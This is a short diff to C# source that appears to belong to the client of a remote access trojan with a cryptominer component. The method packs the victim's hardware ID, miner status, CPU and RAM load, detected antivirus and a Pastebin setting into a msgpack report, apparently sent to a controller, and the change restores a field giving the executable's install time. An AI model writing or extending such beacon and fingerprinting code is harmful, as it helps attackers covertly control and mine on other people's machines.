@@ -30,7 +30,7 @@ namespace Client.Helper
             msgpack.ForcePathObject("Performance").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
             msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
             msgpack.ForcePathObject("Antivirus").AsString = Methods.Antivirus();
-           // msgpack.ForcePathObject("Installed").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
+            msgpack.ForcePathObject("Installed").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
             return msgpack.Encode2Bytes();
         }
     }
